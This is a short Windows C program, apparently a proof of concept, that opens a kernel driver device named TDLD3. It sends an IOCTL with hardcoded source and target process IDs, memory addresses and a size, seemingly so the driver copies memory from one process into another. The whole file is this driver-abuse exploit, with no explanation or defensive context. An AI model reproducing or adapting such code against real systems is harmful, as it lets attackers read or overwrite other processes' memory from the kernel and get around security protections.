
#include <windows.h>
#include <stdio.h>
#include <basetsd.h>

typedef struct _INOUT_PARAM {
    ULONGLONG srcPid;
    ULONGLONG srcAddress;
    ULONGLONG targetPid;
    ULONGLONG targetAddress;
    ULONGLONG size;
    ULONGLONG Param6;
    ULONGLONG Param7;
    ULONGLONG Param8;
    ULONGLONG Param9;
    ULONGLONG Param10;
    ULONGLONG Param11;
} INOUT_PARAM, * PINOUT_PARAM;

#define REQUEST    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

VOID sendRequest()
{
    HANDLE          h;
    INOUT_PARAM     tmp;
    DWORD           bytesIO;

    h = CreateFile(TEXT("\\\\.\\TDLD3"), GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {

        tmp.srcPid = 5412;
        tmp.srcAddress = 0x6520A9F5;
        tmp.targetPid = 7104;
        tmp.targetAddress = 0x0203B3F94940;
        tmp.size = 15;

        DeviceIoControl(h, REQUEST,
            &tmp, sizeof(tmp), &tmp,
            sizeof(tmp), &bytesIO, NULL);

        CloseHandle(h);
    }
    else {
        printf("hFailed");
    }
}

int main(int argc, char * argv[]) {
    sendRequest();
    return 0;
}